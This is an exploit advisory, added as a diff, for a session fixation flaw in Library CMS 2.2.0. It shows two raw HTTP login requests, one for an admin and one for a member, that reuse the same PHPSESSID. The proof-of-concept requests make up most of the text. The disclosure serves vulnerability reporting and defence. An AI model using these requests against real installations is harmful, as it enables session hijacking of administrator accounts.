@@ -1,0 +1,49 @@
+# Exploit Title: Library CMS Powerful Book Management System 2.2.0 - Session Fixation
+# Date: 2020-04-22 
+# Exploit Author: Ismail Tasdelen
+# Vendor Homepage: https://kaasoft.pro/
+# Software : https://codecanyon.net/item/library-cms-powerful-book-management-system/21105281
+# Product Version: v2.2.0
+# Product : Library CMS
+# Vulernability Type : Broken Authentication
+# Vulenrability : Session Fixation
+# CVE : N/A
+
+# Description :
+
+Session Fixation vulnerability has been discovered in v2.2.0
+version of Library CMS Powerful Book Management System.
+
+Admin HTTP Request :
+
+POST /admin/login HTTP/1.1
+Host: XXX.XXX.XXX.XXX
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://XXX.XXX.XXX.XXX/admin/login
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 49
+Connection: close
+Cookie: activeLanguage=en_US; PHPSESSID=nfj6gk1murk6jq47lpk5cv7qq6; activeLanguage=en_US; _ym_uid=1579299191562269050; _ym_d=1579299191; _ym_visorc_46947615=w; _ym_isad=2
+Upgrade-Insecure-Requests: 1
+
+login=USERNAME&password=PASSWORD
+
+Member HTTP Request :
+
+POST /admin/login HTTP/1.1
+Host: XXX.XXX.XXX.XXX
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://XXX.XXX.XXX.XXX/admin/login
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 50
+Connection: close
+Cookie: activeLanguage=en_US; PHPSESSID=nfj6gk1murk6jq47lpk5cv7qq6; activeLanguage=en_US; _ym_uid=1579299191562269050; _ym_d=1579299191; _ym_visorc_46947615=w; _ym_isad=2
+Upgrade-Insecure-Requests: 1
+
+login=USERNAME&password=PASSWORD
